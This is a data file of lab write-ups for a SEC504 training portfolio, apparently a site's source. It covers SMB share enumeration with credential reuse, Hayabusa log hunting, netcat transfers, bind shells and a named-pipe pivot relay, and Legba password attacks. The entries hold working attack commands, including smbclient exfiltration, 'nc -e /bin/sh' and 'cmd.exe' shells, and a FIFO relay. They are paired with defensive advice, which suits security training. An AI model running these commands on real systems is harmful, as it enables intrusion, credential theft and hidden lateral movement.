      { src: "/labs/cloud-recon-154558.png", alt: "tls-scan certificate collection", caption: "tls-scan completes 14/14 handshakes in 0.13s" },
      { src: "/labs/cloud-recon-154644.png", alt: "jq subject CN parsing", caption: "jq maps each IP to its certificate CN; 10.200.74.2 = downloads.falsimentis.com" },
      { src: "/labs/cloud-recon-154815.png", alt: "nmap http-enum on the target", caption: "http-enum: nginx 1.18.0, /robots.txt, and a /css/ directory listing" },
    ],
  },
  {
    id: 27,
    courseSlug: "sec504",
    slug: "smb-share-enumeration-credential-discovery",
    title: "SMB Share Enumeration and Credential Discovery",
    course: "SEC504 - Hacker Tools, Techniques, and Incident Handling",
    role: "Solo, Lab",
    focus: "Network Security",
    level: "SEC504",
    date: "Jun 2026",
    artifacts: "Sanitized smbclient session output from the SEC504 Slingshot Linux lab against a file server at 172.30.0.22 (FLSM-NAS)",
    context:
      "This lab walks a full SMB compromise chain against a NAS: enumerate shares with one set of credentials, read a home directory the account should not have been able to reach, find a stale PowerShell backup script with a hardcoded password, and reuse that password to reach a second share holding a full database backup. Every step uses smbclient, the point being that the whole chain runs from readable files and reused credentials, not an exploit.",
    summary:
      "Started with credentials for tdoudney and listed shares on 172.30.0.22 (IT, CustomerDev, Home, plus the default SYSVOL/NETLOGON/C$/ADMIN$/IPC$). The IT share held logon.cmd (drive mappings) and netssh.cmd (a proxy config pointing at proxy.falsimentis.com:3128). The Home share exposed every user's directory; csparkes was correctly locked (ACCESS_DENIED) but tdoudney's own directory held backup.ps1 and backup.ps1.OLD. The current script used Get-Credential correctly, but the .OLD version hardcoded ConvertTo-SecureString 'Clippers2022' for falsimentis.com\\csparkes. Reusing csparkes/Clippers2022 opened the CustomerDev share, which contained a web app tree and db.backup.sql.zip (33.8 MB).",
    whyThisMatters:
      "SMB shares are where organizations quietly leak the material an attacker needs to move laterally: logon scripts, proxy configs, and backup scripts with credentials baked in. Nothing here was an exploit. It was a readable file share, correct permissions on one directory and not another, and a password that lived on in a .OLD file after someone did the right thing and switched the live script to Get-Credential. That last detail is the whole lesson: fixing the current file does not remove the secret from the old one.",
    tldr: [
      "smbclient enumerated shares on a NAS and exfiltrated a full home directory in a single tar command",
      "A stale backup.ps1.OLD hardcoded ConvertTo-SecureString 'Clippers2022' for another user (csparkes)",
      "Reusing that credential opened a second share holding a 33.8 MB database backup (db.backup.sql.zip)",
    ],
    skillsDemonstrated: [
      "SMB share enumeration with smbclient (-L, user%pass)",
      "Interactive smbclient navigation and file retrieval",
      "In-session exfiltration with smbclient tar",
      "Credential discovery in logon and backup scripts",
      "Lateral movement via credential reuse",
    ],
    tools: ["smbclient", "Nmap 7.60", "tar", "Slingshot Linux", "CLI"],
    steps: [
      "Confirm the NAS is up and 139/445 are open with nmap",
      "List shares with smbclient, first prompting then inline credentials",
      "Read the IT share: logon.cmd drive maps and netssh.cmd proxy config",
      "Browse the Home share and confirm per-user ACLs",
      "Exfiltrate a home directory with smbclient tar and extract locally",
      "Read backup.ps1.OLD and recover the hardcoded credential",
      "Reuse the credential to open the CustomerDev share",
    ],
    stepDetails: [
      {
        title: "Confirm the target and enumerate shares",
        description:
          "nmap confirmed only 172.30.0.22 was up with 139/netbios-ssn and 445/microsoft-ds open. smbclient -L listed the shares. Passing credentials inline as user%pass avoids the prompt; the SMB1 workgroup-listing failure at the end is expected because SMB1 is disabled.",
        command: "sudo nmap -sT -p 139,445 172.30.0.2-254\nsmbclient -L //172.30.0.22 -U tdoudney%Falsimentis123",
        commandBreakdown: "-L: list shares\n-U user%pass: inline credentials",
        screenshot: "/labs/smb-security-101623.png",
      },
      {
        title: "Read the IT share scripts",
        description:
          "The IT share held logon.cmd and netssh.cmd. logon.cmd mapped drives (net use z: \\\\FLSM-NAS\\Users), and netssh.cmd set a WinHTTP proxy to proxy.falsimentis.com:3128. Logon scripts are reconnaissance gold: they name internal hosts, shares, and the proxy an attacker would route through.",
        command: "smbclient //172.30.0.22/IT -U tdoudney%Falsimentis123\nget logon.cmd\nget netssh.cmd",
        commandBreakdown: "get <file>: download from the share\nlogon.cmd/netssh.cmd reveal internal infrastructure",
        screenshot: "/labs/smb-security-101929.png",
      },
      {
        title: "Browse Home and check per-user ACLs",
        description:
          "The Home share exposed csparkes, ttidmas, and tdoudney directories. csparkes was correctly protected (NT_STATUS_ACCESS_DENIED on ls), but tdoudney's own directory was readable and held backup.ps1, backup.ps1.OLD, and a ScoutSuite report.",
        command: "smbclient //172.30.0.22/Home -U tdoudney%Falsimentis123\ncd csparkes\nls\ncd ../tdoudney\nls",
        commandBreakdown: "ACCESS_DENIED on csparkes = correct ACL; tdoudney's own dir is readable",
        screenshot: "/labs/smb-security-102921.png",
      },
      {
        title: "Exfiltrate the home directory in one command",
        description:
          "smbclient's built-in tar streamed the whole directory (16.2 MB) into a single local tarball, then extracted it. One command exfiltrates an entire share path, no per-file get loop needed.",
        command: "tar c tdoudney-home.tar\n# locally:\ntar xf tdoudney-home.tar",
        commandBreakdown: "tar c: create archive of the current share path\nStreams every file in one operation",
        screenshot: "/labs/smb-security-103012.png",
      },
      {
        title: "Recover the hardcoded credential",
        description:
          "backup.ps1 correctly used Get-Credential (interactive, no stored secret). But backup.ps1.OLD hardcoded ConvertTo-SecureString 'Clippers2022' -AsPlainText -Force for falsimentis.com\\csparkes. Someone fixed the live script and left the password sitting in the .OLD copy.",
        command: "cat backup.ps1\ncat backup.ps1.OLD",
        commandBreakdown: "The .OLD file still contains the plaintext password the live script no longer stores",
        screenshot: "/labs/smb-security-103345.png",
      },
      {
        title: "Reuse the credential for lateral movement",
        description:
          "csparkes/Clippers2022 opened the CustomerDev share, which held a full web application tree (index.php, install.php, version.php, engine/, mod/) and db.backup.sql.zip at 33.8 MB. A stale password in one user's home directory became read access to another user's database backup.",
        command: "smbclient //172.30.0.22/CustomerDev -U csparkes%Clippers2022\ncd FS\nls",
        commandBreakdown: "Reused discovered credential; CustomerDev holds the app source + db backup",
        screenshot: "/labs/smb-security-103559.png",
      },
    ],
    outcome:
      "Chained SMB share enumeration into lateral movement without a single exploit: readable logon scripts, a home directory with correct ACLs on one folder and a leaked script in another, a hardcoded credential in a stale backup file, and credential reuse into a share holding a 33.8 MB database backup.",
    nextStepsInProduction:
      "Rotate the csparkes credential immediately and grep every share for ConvertTo-SecureString, -AsPlainText, and password patterns in .ps1/.OLD/.bak files. Move backup credentials to a managed secret store (or gMSA) so scripts never hold plaintext. Audit share ACLs so home directories are per-user private by default, and remove stale .OLD/.bak script copies. Enable SMB access auditing so mass reads like the tar exfiltration are visible.",
    securityControlsRelevant: [
      "Secret management for service and backup credentials (no plaintext in scripts)",
      "Least-privilege share ACLs (per-user private home directories)",
      "Removal of stale .OLD/.bak script copies",
      "SMB access and file-read auditing",
      "Credential rotation on discovery of exposure",
    ],
    keyFindings: [
      "Home share exposed all user directories; csparkes correctly denied, tdoudney readable",
      "backup.ps1.OLD hardcoded 'Clippers2022' for falsimentis.com\\csparkes",
      "Live backup.ps1 correctly used Get-Credential; the leak was only in the .OLD copy",
      "csparkes/Clippers2022 opened CustomerDev, exposing db.backup.sql.zip (33.8 MB)",
      "smbclient tar exfiltrated a 16.2 MB home directory in one command",
    ],
    takeaway: [
      "The single most important detail is the .OLD file. The developer did the right thing: the live backup.ps1 uses Get-Credential and stores nothing. But the previous version, with the password compiled in, was never deleted. Remediation that only touches the current file leaves the secret fully recoverable in version history, backup copies, and stale filenames. Rotating the credential is the only fix that actually works, because you can never be sure you have found every copy.",
      "Nothing in this chain was an exploit, and that is what makes it realistic. Share enumeration, a readable logon script, a home directory, credential reuse: every step is a normal file operation that a legitimate user could perform. Defenses that wait for an exploit signature will never fire here. The controls that matter are permissions, secret hygiene, and access auditing, none of which involve a CVE.",
    ],
    screenshots: [
      { src: "/labs/smb-security-101337.png", alt: "nmap for SMB ports", caption: "172.30.0.22 up with 139/netbios-ssn and 445/microsoft-ds" },
      { src: "/labs/smb-security-101445.png", alt: "smbclient share listing prompt", caption: "smbclient -L prompts for tdoudney's password" },
      { src: "/labs/smb-security-101623.png", alt: "Share list with inline credentials", caption: "Shares: IT, CustomerDev, Home, SYSVOL, NETLOGON, C$, ADMIN$, IPC$" },
      { src: "/labs/smb-security-101859.png", alt: "IT share contents", caption: "IT share: logon.cmd, netssh.cmd, articles/" },
      { src: "/labs/smb-security-101929.png", alt: "logon.cmd drive mappings", caption: "logon.cmd maps z: to \\\\FLSM-NAS\\Users and h: to Home" },
      { src: "/labs/smb-security-102015.png", alt: "get netssh.cmd", caption: "Retrieving netssh.cmd from the IT share" },
      { src: "/labs/smb-security-102056.png", alt: "netssh.cmd proxy config", caption: "netsh winhttp set proxy proxy.falsimentis.com:3128" },
      { src: "/labs/smb-security-102723.png", alt: "Home share user directories", caption: "Home share exposes csparkes, ttidmas, tdoudney" },
      { src: "/labs/smb-security-102921.png", alt: "Per-user ACL check", caption: "csparkes denied (correct ACL); tdoudney readable with backup.ps1 + .OLD" },
      { src: "/labs/smb-security-103012.png", alt: "smbclient tar exfiltration", caption: "tar c exfiltrates 16.2 MB in one command" },
      { src: "/labs/smb-security-103253.png", alt: "Extract the tarball locally", caption: "tar xf tdoudney-home.tar unpacks the exfiltrated files" },
      { src: "/labs/smb-security-103314.png", alt: "Extracted home directory", caption: "backup.ps1, backup.ps1.OLD, images, and ScoutSuite.zip" },
      { src: "/labs/smb-security-103345.png", alt: "Hardcoded credential in backup.ps1.OLD", caption: "backup.ps1.OLD: ConvertTo-SecureString 'Clippers2022' for csparkes" },
      { src: "/labs/smb-security-103559.png", alt: "Lateral move to CustomerDev", caption: "csparkes/Clippers2022 opens CustomerDev with db.backup.sql.zip (33.8 MB)" },
    ],
  },
  {
    id: 28,
    courseSlug: "sec504",
    slug: "windows-event-log-threat-hunting-hayabusa",
    title: "Windows Event Log Threat Hunting with Hayabusa and Sigma",
    course: "SEC504 - Hacker Tools, Techniques, and Incident Handling",
    role: "Solo, Lab",
    focus: "Threat Hunting",
    level: "SEC504",
    date: "Jun 2026",
    artifacts: "Sanitized Hayabusa CSV timeline and Timeline Explorer views from the SEC504 lab against a compromised Windows 10 EVTX set",
    context:
      "This lab runs Hayabusa, a Sigma-based EVTX detection engine, over a compromised Windows 10 event log set (361 files, 35.5 MB) and triages the results in Timeline Explorer. The point is data reduction: turning thousands of raw events into a ranked list of detections, then grouping to find the handful of high-severity alerts that describe the actual attack.",
    summary:
      "Ran Hayabusa csv-timeline over 361 EVTX files with the full rule set (4,151 detection rules: 167 Hayabusa + 3,984 Sigma). After channel filtering, 2,031 rules ran against 16 relevant logs. Of 4,419 events, 2,983 produced hits (32.5% reduction), collapsing to 33 unique detections: 0 critical, 3 high, 66 medium, 1,573 low, 1,347 informational. All 3 high alerts were log-clearing (Important Log File Cleared x2, Log Cleared x1), a classic anti-forensics signal. Loaded the CSV into Timeline Explorer, grouped by Level then Rule Title, and reconstructed the anti-forensics window: six consecutive log-clear events at 10:18:28, then logoff and Event Log Service stopped seconds later.",
    whyThisMatters:
      "An analyst cannot read 4,419 raw events, but they can act on 33 detections and read 3 high alerts. Hayabusa applies the open Sigma rule set to Windows logs to do that reduction, and the grouping step in Timeline Explorer is what turns the output into an incident narrative. The high alerts here were all log clearing, which is the tell that an attacker tried to erase their tracks, and finding it fast is the difference between catching the intrusion and cleaning it up later.",
    tldr: [
      "Hayabusa applied 4,151 Sigma + Hayabusa rules to 361 EVTX files, reducing 4,419 events to 33 unique detections",
      "All 3 high-severity alerts were log-clearing events, a direct anti-forensics indicator",
      "Timeline Explorer grouping reconstructed the sequence: six log-clears, then logoff, then Event Log Service stopped",
    ],
    skillsDemonstrated: [
      "Sigma-based EVTX detection with Hayabusa (csv-timeline)",
      "Rule-set selection and channel filtering",
      "Severity-based triage of detection output",
      "Timeline Explorer grouping and pivoting",
      "Anti-forensics (log-clearing) detection",
    ],
    tools: ["Hayabusa 2.16.0", "Sigma rules", "Timeline Explorer 2.0", "Windows 10", "EVTX"],
    steps: [
      "Review Hayabusa subcommands and pick csv-timeline",
      "Run csv-timeline over the EVTX directory with the full rule set",
      "Read the scan summary: rules loaded, events, data reduction",
      "Read the results summary by severity",
      "Read the top alerts per severity level",
      "Load the CSV into Timeline Explorer and group by Level then Rule Title",
      "Reconstruct the anti-forensics timeline from the grouped rows",
    ],
    stepDetails: [
      {
        title: "Choose the detection subcommand",
        description:
          "hayabusa.exe with no arguments lists the subcommands: csv-timeline and json-timeline for full detection output, plus logon-summary, eid-metrics, and search for quick pivots. csv-timeline is the one that produces a Timeline Explorer-ready file.",
        command: ".\\hayabusa.exe",
        commandBreakdown: "csv-timeline: full detection timeline\nlogon-summary/eid-metrics: quick stats",
        screenshot: "/labs/hayabusa-103717.png",
      },
      {
        title: "Run the full detection timeline",
        description:
          "Ran csv-timeline over the EVTX directory. The scan wizard offered rule set 5 (all event and alert rules, 4,417) and prompted for deprecated, unsupported, noisy, and sysmon rules. Including sysmon rules (3,685) added meaningful coverage. Total input: 361 EVTX files, 35.5 MB.",
        command: ".\\hayabusa.exe csv-timeline --directory C:\\Tools\\win10evtx\\ -o win10-threatdetect.csv --no-color",
        commandBreakdown: "--directory: EVTX folder\n-o: output CSV\n--no-color: clean output for redirection",
        screenshot: "/labs/hayabusa-104043.png",
      },
      {
        title: "Read the scan summary and data reduction",
        description:
          "After channel filtering, 16 logs matched and 2,031 rules ran (167 Hayabusa + 3,984 Sigma = 4,151 total). Of 4,419 events, 2,983 produced hits, a 32.5% reduction. The value of a detection engine is exactly this: it tells you which fraction of events are worth an analyst's attention.",
        command: "# scan summary section of the run",
        commandBreakdown: "4,151 rules over 16 logs; 4,419 events -> 2,983 with hits",
        screenshot: "/labs/hayabusa-104135.png",
      },
      {
        title: "Triage by severity",
        description:
          "The results summary broke 2,989 total detections into 33 unique: 0 critical, 3 high (2 unique), 66 medium, 1,573 low, 1,347 informational. Three high alerts is a list an analyst can actually read, which is the entire goal of running the engine first.",
        command: "# results summary section",
        commandBreakdown: "0 critical / 3 high / 66 medium / 1,573 low / 1,347 info",
        screenshot: "/labs/hayabusa-104153.png",
      },
      {
        title: "Read the top alerts and spot the anti-forensics",
        description:
          "The top high alerts were all log-clearing: Important Log File Cleared (x2) and Log Cleared (x1). Top medium included Potentially Malicious PowerShell (57) and password guessing/spray. Log clearing at the top of the high list is the signal that someone tried to erase evidence.",
        command: "# top alerts by severity",
        commandBreakdown: "High = log clearing; medium = malicious PowerShell + password attacks",
        screenshot: "/labs/hayabusa-104206.png",
      },
      {
        title: "Group in Timeline Explorer and rebuild the sequence",
        description:
          "Loaded the CSV into Timeline Explorer and dragged the Level and Rule Title headers to group. This collapsed 2,989 rows into a readable tree and exposed the anti-forensics window: six consecutive Log Cleared events at 10:18:28-29, then Logoff / RDS Session Logoff at 10:19:06, then Event Log Service Stopped at 10:19:08. The cell viewer showed the full EID 4104 ScriptBlock text for the PowerShell hits.",
        command: "# Timeline Explorer: drag Level, then Rule Title, to the group bar",
        commandBreakdown: "Grouping turns a flat CSV into an incident timeline",
        screenshot: "/labs/hayabusa-104739.png",
      },
    ],
    outcome:
      "Reduced 4,419 raw Windows events to 33 unique detections and 3 high-severity alerts, all of which were log-clearing. Grouping in Timeline Explorer reconstructed a clear anti-forensics sequence (mass log clear, then logoff, then Event Log Service stopped), giving an incident narrative from what started as an unreadable pile of EVTX files.",
    nextStepsInProduction:
      "Forward EVTX to a SIEM and run Sigma rules continuously rather than after the fact, alerting immediately on 1102 (Security log cleared) and 104 (log cleared) since those were the high-fidelity indicators here. Enable PowerShell script-block logging (4104) fleet-wide so the malicious-PowerShell detections have full command text. Baseline normal logon and account-management volume so the low/informational tier (explicit logons, group changes) can be diffed rather than read.",
    securityControlsRelevant: [
      "Centralized log forwarding to a SIEM (logs off the host beat log clearing)",
      "Alerting on log-clear events (Security 1102, System 104)",
      "PowerShell script-block logging (EID 4104)",
      "Sigma rule coverage and tuning",
      "Baselining of logon and account-management event volume",
    ],
    keyFindings: [
      "4,151 rules over 16 logs reduced 4,419 events to 33 unique detections (32.5% hit rate)",
      "All 3 high-severity alerts were log-clearing (anti-forensics)",
      "Top medium detection was Potentially Malicious PowerShell (57 hits)",
      "Timeline: six log-clears at 10:18:28, logoff at 10:19:06, Event Log Service stopped at 10:19:08",
      "EID 4104 script-block text was recoverable in the Timeline Explorer cell viewer",
    ],
    takeaway: [
      "The number that matters is 4,419 down to 33. No analyst triages four thousand events, but everyone can read thirty-three detections and act on three high alerts. That reduction is the entire argument for running a Sigma engine over raw logs before a human looks at them, and it is why detection-as-code beats manual log review at any real scale.",
      "Log clearing being the top high-severity finding is the tell. An attacker who clears logs is telling you two things: they had the privilege to do it, and they expected someone to look. The defensive countermove is to get logs off the host in real time, because once they are in a SIEM, clearing the local copy destroys nothing and the clear event itself becomes one of your highest-fidelity alerts.",
    ],
    screenshots: [
      { src: "/labs/hayabusa-103717.png", alt: "Hayabusa subcommands", caption: "Hayabusa 2.16.0 subcommands: csv-timeline, logon-summary, search, and more" },
      { src: "/labs/hayabusa-104043.png", alt: "csv-timeline scan wizard", caption: "Scanning 361 EVTX files (35.5 MB) with the full rule set incl. sysmon rules" },
      { src: "/labs/hayabusa-104135.png", alt: "Rule and channel summary", caption: "4,151 rules; after channel filter 16 logs and 2,031 rules run" },
      { src: "/labs/hayabusa-104153.png", alt: "Results summary by severity", caption: "4,419 events -> 33 unique detections: 0 crit, 3 high, 66 med, 1,573 low" },
      { src: "/labs/hayabusa-104206.png", alt: "Top alerts by level", caption: "Top high alerts are all log-clearing; medium includes malicious PowerShell" },
      { src: "/labs/hayabusa-104632.png", alt: "Timeline Explorer flat view", caption: "win10-threatdetect.csv loaded: 2,989 rows across all severities" },
      { src: "/labs/hayabusa-104739.png", alt: "Grouped by Level and Rule Title", caption: "Grouping collapses the CSV; high = 3 (2 log-clear titles)" },
      { src: "/labs/hayabusa-104939.png", alt: "EID 4104 script-block cell", caption: "Cell viewer shows the full PowerShell ScriptBlock text (EID 4104)" },
    ],
  },
  {
    id: 29,
    courseSlug: "sec504",
    slug: "netcat-transfer-shells-pivot-relays",
    title: "Netcat for Data Transfer, Shells, and Pivot Relays",
    course: "SEC504 - Hacker Tools, Techniques, and Incident Handling",
    role: "Solo, Lab",
    focus: "Network Security",
    level: "SEC504",
    date: "Jun 2026",
    artifacts: "Sanitized netcat session output across Linux and Windows hosts from the SEC504 lab, including a named-pipe relay pivot",
    context:
      "This lab exercises netcat across every mode that matters in an intrusion: chat, file transfer in both directions, bind shells on Linux and Windows, and a bidirectional relay that pivots through a compromised host to reach a network the attacker cannot touch directly. The through-line is that one small binary is a Swiss-army knife for moving data and access once you have a foothold.",
    summary:
      "Used netcat between a Slingshot Linux host and a Windows host for listener/client chat, then transferred files both ways (Get-Content piped into nc on Windows, redirect out on Linux, and the reverse with Out-File). Set up bind shells on both operating systems (nc -l -p 7777 -e /bin/sh on Linux; nc <ip> 8888 -e cmd.exe on Windows), confirming SYSTEM-adjacent context on each. The finale was a pivot: the attacker could not reach 172.30.0.55, but a compromised pivot host at 172.30.0.50 could. A named-pipe relay (mkfifo namedpipe; nc -l -p 8080 < namedpipe | nc 172.30.0.55 80 > namedpipe) let the attacker curl the target through the pivot; the target's access log showed the pivot's IP, not the attacker's.",
    whyThisMatters:
      "Netcat is on nearly every host and blends into normal traffic, which is why it shows up in real intrusions for exactly these tasks. The relay is the part defenders underestimate: a compromised host becomes a transparent proxy, so the target logs the pivot's address and the attacker's real source never appears. Understanding the named-pipe trick is what lets an analyst read a proxied-connection log correctly instead of chasing the wrong IP.",
    tldr: [
      "One netcat binary handled chat, two-way file transfer, and bind shells on both Linux and Windows",
      "A named-pipe relay (mkfifo + two nc processes) pivoted through a compromised host to an unreachable target",
      "The target's access log recorded the pivot's IP, not the attacker's: the relay launders the source address",
    ],
    skillsDemonstrated: [
      "netcat listener/client fundamentals (-l, -p)",
      "Bidirectional file transfer over netcat",
      "Bind shells with -e on Linux and Windows",
      "Named-pipe (FIFO) bidirectional relays",
      "Pivoting and source-IP obfuscation",
    ],
    tools: ["netcat (traditional)", "PowerShell", "mkfifo", "curl", "Slingshot Linux", "Windows 10"],
    steps: [
      "Confirm connectivity between the Linux and Windows hosts",
      "Set up a listener/client chat session",
      "Transfer a file Windows to Linux, then Linux to Windows",
      "Open a bind shell on Linux and connect from Windows",
      "Open a bind shell on Windows and connect from Linux",
      "Build a named-pipe relay on a pivot host",
      "Reach an otherwise-unreachable target through the pivot and confirm in logs",
    ],
    stepDetails: [
      {
        title: "Listener/client chat",
        description:
          "The simplest netcat use: a listener on one host (nc -l -p 2222) and a client connecting to it from the other. Whatever one side types, the other sees. This confirms bidirectional connectivity and is the mental model for every mode that follows.",
        command: "# Linux listener\nnc -l -p 2222\n# Windows client\nnc 10.10.75.1 2222",
        commandBreakdown: "-l: listen mode\n-p: port; same syntax on both OSes",
        screenshot: "/labs/netcat-105856.png",
      },
      {
        title: "File transfer, both directions",
        description:
          "Windows to Linux: pipe a file into a listener (Get-Content .\\text.txt | nc -l -p 1234) and redirect it out on the receiver (nc 10.10.0.1 1234 > received.txt). Then the reverse, with Out-File on the Windows side. netcat is a file-transfer tool as much as a shell tool.",
        command: "# Win: Get-Content .\\text.txt | nc -l -p 1234\n# Linux: nc 10.10.0.1 1234 > received.txt\n# Linux: cat file.txt | nc 10.10.0.1 4321\n# Win: nc -l -p 4321 | Out-File received2.txt",
        commandBreakdown: "Sender pipes in, receiver redirects out; works either direction",
        screenshot: "/labs/netcat-110033.png",
      },
      {
        title: "Bind shell on Linux",
        description:
          "nc -l -p 7777 -e /bin/sh binds a shell to a listener; the Windows client connects and runs commands on the Linux host. whoami/id confirmed the sec504 user and its group memberships (docker, sudo, and others worth noting for privilege escalation).",
        command: "# Linux: nc -l -p 7777 -e /bin/sh\n# Windows: nc 10.10.75.1 7777\nwhoami; id; pwd",
        commandBreakdown: "-e /bin/sh: bind a shell to the connection",
        screenshot: "/labs/netcat-110750.png",
      },
      {
        title: "Bind shell on Windows",
        description:
          "The same pattern in reverse: nc <ip> 8888 -e cmd.exe on Windows, listener on Linux. Confirmed the host (Sec504Student, Windows 10.0.19044) and dropped into C:\\WINDOWS\\system32. netcat gives a shell on either operating system with the same two commands.",
        command: "# Windows: nc 10.10.75.1 8888 -e cmd.exe\n# Linux: nc -l -p 8888\necho %username%; hostname; dir",
        commandBreakdown: "-e cmd.exe: bind the Windows shell",
        screenshot: "/labs/netcat-111158.png",
      },
      {
        title: "Port-check through a pivot",
        description:
          "The attacker's -z scan of 172.30.0.55:80 timed out (no direct route), but from the compromised pivot host at 172.30.0.50 the same scan reported the port open. This establishes that the pivot can reach the target the attacker cannot.",
        command: "# attacker (fails):\nnc -vvv -z -w3 172.30.0.55 80\n# pivot (succeeds):\nnc -vvv -z -w3 172.30.0.55 80",
        commandBreakdown: "-z: zero-I/O port scan\n-w3: 3s timeout\n-vvv: verbose",
        screenshot: "/labs/netcat-111654.png",
      },
      {
        title: "Named-pipe relay and log confirmation",
        description:
          "On the pivot, a FIFO makes the relay bidirectional: nc -l -p 8080 < namedpipe | nc 172.30.0.55 80 > namedpipe. The attacker then curls http://172.30.0.50:8080 and gets the target's page (a CTF password). Critically, the target's access log records 172.30.0.50 (the pivot) as the client, not the attacker. The relay launders the source IP.",
        command: "mkfifo namedpipe\nnc -l -p 8080 < namedpipe | nc 172.30.0.55 80 > namedpipe\n# attacker:\ncurl http://172.30.0.50:8080",
        commandBreakdown: "FIFO carries the response back into the first nc, making the relay two-way",
        screenshot: "/labs/netcat-111913.png",
      },
    ],
    outcome:
      "Exercised netcat end to end: chat, two-way file transfer, bind shells on Linux and Windows, and a named-pipe relay that pivoted through a compromised host to reach an otherwise-unreachable target. The target's log showed the pivot's IP, demonstrating how a relay hides the attacker's true source.",
    nextStepsInProduction:
      "Alert on netcat-style behavior rather than the binary name: outbound connections from server processes, shells spawned by network listeners, and long-lived connections between internal hosts that normally do not talk. Segment networks so a single compromised host cannot relay into sensitive ranges, and treat any host that suddenly proxies traffic (source IP in a target log that does not match the real client) as compromised. Correlate logs across hops so a laundered source IP can be traced back through the pivot.",
    securityControlsRelevant: [
      "Egress filtering and detection of shells spawned by listeners",
      "Network segmentation to limit pivot reach",
      "Cross-host log correlation to defeat source-IP laundering",
      "EDR detection of -e shell behavior and FIFO relays",
    ],
    keyFindings: [
      "netcat handled chat, file transfer both ways, and bind shells on Linux and Windows with the same primitives",
      "A named-pipe relay turned a compromised host into a transparent proxy to an unreachable target",
      "The target access log recorded the pivot IP (172.30.0.50), not the attacker's",
      "-z -w3 through the pivot confirmed reachability the attacker lacked directly",
    ],
    takeaway: [
      "The relay is the lesson defenders miss. Once a host is compromised, two netcat processes and a FIFO turn it into a proxy, and the target logs the pivot's address as the client. An analyst who trusts the source IP in that log will investigate the wrong machine entirely. Reading proxied traffic correctly means correlating across hops, not trusting a single log's idea of who connected.",
      "netcat earns its reputation because it is small, everywhere, and dual-use. Every mode here (transfer, shell, relay) is also a legitimate admin task, so signature-based detection on the binary is weak. The durable detections are behavioral: a service process opening an outbound connection, a shell whose parent is a network listener, or an internal host that suddenly starts relaying traffic it never handled before.",
    ],
    screenshots: [
      { src: "/labs/netcat-105658.png", alt: "Linux ping to target", caption: "Connectivity check from the Linux host" },
      { src: "/labs/netcat-105706.png", alt: "Windows ping to target", caption: "Connectivity check from the Windows host" },
      { src: "/labs/netcat-105856.png", alt: "netcat chat client", caption: "Windows client connects to the Linux listener on 2222" },
      { src: "/labs/netcat-105902.png", alt: "netcat chat listener", caption: "Linux listener receives the typed messages" },
      { src: "/labs/netcat-110033.png", alt: "File transfer Windows to Linux", caption: "Get-Content piped into nc -l serves the file" },
      { src: "/labs/netcat-110147.png", alt: "File received on Linux", caption: "nc ... > received.txt captures the transferred file" },
      { src: "/labs/netcat-110421.png", alt: "Listener with Out-File", caption: "Windows: nc -l -p 4321 | Out-File received2.txt" },
      { src: "/labs/netcat-110503.png", alt: "Send from Linux", caption: "cat file.txt | nc 10.10.0.1 4321 sends the file back" },
      { src: "/labs/netcat-110509.png", alt: "File received on Windows", caption: "Get-Content received2.txt confirms the transfer" },
      { src: "/labs/netcat-110744.png", alt: "Linux bind shell listener", caption: "nc -l -p 7777 -e /bin/sh binds a shell" },
      { src: "/labs/netcat-110750.png", alt: "Shell into Linux from Windows", caption: "whoami/id in the bound Linux shell shows sec504 group memberships" },
      { src: "/labs/netcat-111152.png", alt: "Windows bind shell", caption: "nc 10.10.75.1 8888 -e cmd.exe binds the Windows shell" },
      { src: "/labs/netcat-111158.png", alt: "Shell into Windows from Linux", caption: "hostname/dir in the bound Windows shell (Sec504Student)" },
      { src: "/labs/netcat-111654.png", alt: "Pivot reachability", caption: "Attacker scan times out; pivot 172.30.0.50 reaches 172.30.0.55:80" },
      { src: "/labs/netcat-111913.png", alt: "Named-pipe relay and log", caption: "curl through the relay; target log shows the pivot IP, not the attacker" },
    ],
  },
  {
    id: 30,
    courseSlug: "sec504",
    slug: "online-password-attacks-legba",
    title: "Online Password Attacks with Legba: Stuffing, Dictionary, and Spray",
    course: "SEC504 - Hacker Tools, Techniques, and Incident Handling",
    role: "Solo, Lab",
    focus: "Password Management & Cryptography",
    level: "SEC504",
    date: "Jul 2026",
    artifacts: "Sanitized Legba output against HTTP Basic, MySQL, and SMB services from the SEC504 lab (172.30.0.0/24)",
    context:
      "This lab uses Legba, a modern multi-protocol credential brute-forcer, to run the three distinct online password attacks against the right targets: credential stuffing against HTTP Basic auth, single-user dictionary against MySQL, and password spraying against SMB. The value is the taxonomy: the same tool, different flag combinations, three fundamentally different attacks with different detection profiles.",
    summary:
      "Mapped five hosts on 172.30.0.0/24 with nmap, then ran Legba against three. Credential stuffing with a user:pass combo list against HTTP Basic auth on 172.30.0.12 found admin:tiksight in 596 attempts (1.38s). A single-user dictionary attack against MySQL on 172.30.0.64 found root:changeme from the 10k-most-common list. Password spraying against SMB on 172.30.0.155, one password across a username list, found ttidmas:Falsimentis123 and, on a second pass, ptrouel:Falsimentis!. Each attack type used a distinct Legba flag pattern: -C for a combo list, -U user -P wordlist for dictionary, and -U userlist -P singlepassword for spray.",
    whyThisMatters:
      "Password spraying is the attack that beats account lockout, because one password tried across many accounts never trips a per-account threshold, and it is how real intrusions get their first valid credential. Knowing the difference between stuffing, dictionary, and spray, and that they look different in the logs, is what lets a defender build the right detection: stuffing and dictionary spike failures on one account, spraying spreads a few failures across many. Legba makes the taxonomy concrete because the flags map directly to the attack shapes.",
    tldr: [
      "Legba ran three distinct online attacks: credential stuffing (HTTP Basic), dictionary (MySQL), and spray (SMB)",
      "Credential stuffing found admin:tiksight in 596 attempts in 1.38s against HTTP Basic auth",
      "Password spraying (one password, many users) beat lockout and found ttidmas:Falsimentis123 over SMB",
    ],
    skillsDemonstrated: [
      "Multi-protocol online password attacks with Legba",
      "Credential stuffing with combo lists (-C)",
      "Single-user dictionary attacks (-U user -P wordlist)",
      "Password spraying (-U userlist -P single) to evade lockout",
      "Credential reuse validation across services",
    ],
    tools: ["Legba 0.11.0", "Nmap 7.60", "Slingshot Linux", "CLI"],
    steps: [
      "Map the subnet and identify services with nmap",
      "Inspect the available credential and username wordlists",
      "Credential-stuff HTTP Basic auth with a combo list",
      "Validate the found credential against MySQL",
      "Run a single-user dictionary attack against MySQL",
      "Password-spray SMB with one password across a username list",
    ],
    stepDetails: [
      {
        title: "Map the targets",
        description:
          "nmap found five hosts: 172.30.0.12 (HTTP), .35 (HTTP), .64 (MySQL), .155 (SMB), .185 (SSH+HTTP). Each service maps to a Legba protocol module, so the scan directly determines which attack to run where.",
        command: "sudo nmap -sT 172.30.0.2-254",
        commandBreakdown: "Maps services to the Legba protocol modules to target",
